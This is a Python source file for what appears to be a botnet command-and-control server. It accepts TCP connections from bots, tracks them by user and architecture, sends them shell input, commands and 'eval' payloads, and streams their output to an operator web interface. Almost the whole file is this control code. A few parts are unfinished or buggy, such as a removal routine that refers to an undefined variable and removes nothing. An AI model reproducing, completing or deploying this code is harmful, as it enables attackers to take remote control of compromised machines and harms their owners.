import time
import json
from threading import Thread, Condition
from threading import Lock
import select

try: from server import formatsock
except: import formatsock


class BotNet(Thread):
    INPUT_TIMEOUT = 1

    def __init__(self, socketio):
        super().__init__()
        self.connlock = Lock()
        self.conncon = Condition(self.connlock)
        self.allConnections = {}
        self.socketio = socketio

    def addConnection(self, user, conn):
        with self.connlock:
            if user in self.allConnections:
                pass # TODO: How to deal with duplicate usernames?
            self.allConnections[user] = conn
            self.conncon.notifyAll()
            # Notify recv thread

    def removeConnection(self, user):
        with self.connlock:
            if user in self.allConnections:
                 # terminate and remove
                self.socketio.emit('disconnect', {'user': user}, namespace='/bot')
                print("[-] Lost connection to {}".format(bot.user))
            # Notify recv thread

    def getConnection(self,user):
        with self.connlock:
            if user in self.allConnections:
                return self.allConnections[user]
            return None

    def getConnections(self):
        with self.connlock:
            return self.allConnections.keys()

    def run(self):
        while True:
            with self.connlock:
                bots = list(self.allConnections.values())
                while len(bots) == 0:
                    self.conncon.wait()
                    bots = list(self.allConnections.values())
            # Waiting for bot input, rescan for new bots every INPUT_TIMEOUT
            # TODO maybe use pipe as interrupt instead of timeout?
            rs, _, _ = select.select(bots,[],[],BotNet.INPUT_TIMEOUT)
            # We now have a tuple of all bots that have sent data to the botnet
            for bot in rs:
                user = bot.user
                try:
                    msg = bot.recv()
                    # TODO: emit/broadcast this message to anyone on the <user> channel/room
                    jsonobj = json.loads(msg.decode('UTF-8'))
                    jsonobj['user'] = user
                    self.socketio.emit('response', jsonobj,namespace="/bot")
                except IOError:
                    # Connection was interrupted
                    # TODO: inform users
                    self.removeConnection(user)


class BotServer(Thread):
    def __init__(self, tcpsock, botnet, socketio):
        Thread.__init__(self)
        self.tcpsock = tcpsock
        self.botnet = botnet
        self.socketio = socketio

    def run(self):
        while True:
            self.tcpsock.listen(5)
            (clientsock, (ip, port)) = self.tcpsock.accept()
            clientformatsock = formatsock.FormatSocket(clientsock)
            msgbytes = clientformatsock.recv()
            host_info = json.loads(msgbytes.decode('UTF-8'))

            user = host_info['user'].strip()
            print("[+] Received connection from {}".format(user))
            self.botnet.addConnection(user,Bot(clientsock, host_info))

            self.socketio.emit('connection', {'user': user}, namespace='/bot')

            # To test continuous stream, stdout is broken into multiple packets, hangs when waiting
            # self.botnet.getConnection(user).sendStdin('find /usr/local/lib\n')

class Bot:
    def __init__(self, sock, host_info):
        self.sock = formatsock.FormatSocket(sock)
        self.arch = host_info['arch'][:-1]
        self.user = host_info['user'][:-1]

    def send(self, cmd, type="stdin"):
        json_str = json.dumps({type:cmd})
        self.sock.send(json_str)

    def sendStdin(self, cmd):
        self.send(cmd, type="stdin")

    def sendCmd(self, cmd):
        self.send(cmd, type="cmd")

    def sendEval(self, cmd):
        self.send(cmd, type="eval")

    def recv(self):
        return self.sock.recv()

    def fileno(self):
        '''
        Returns the OS fileno of the underlying socket, that way the
        OS can wait for IO on the fileno and allow us to serve many bots
        simultaneously
        '''
        return self.sock.fileno()
